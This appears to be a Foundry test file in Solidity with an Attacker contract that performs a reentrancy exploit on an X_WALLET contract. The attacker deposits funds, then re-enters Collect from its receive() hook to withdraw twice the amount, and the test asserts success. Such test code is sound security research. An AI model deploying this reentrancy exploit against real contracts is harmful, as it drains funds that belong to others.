
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {

    X_WALLET public xWallet;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        xWallet = new X_WALLET(address(logFile));
        
        _attacker = new Attacker(address(xWallet));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        vm.assume(attackVal > 0);
        

        // --- 2. State Configuration (Pre-Condition) ---
        

        // --- 3. Funding ---
        
        vm.deal(address(xWallet), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    X_WALLET public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = X_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: msg.value}(block.timestamp);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        attackAmount = val;
        victim.Collect(val);
        if (address(this).balance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }

    fallback() external payable {}
}
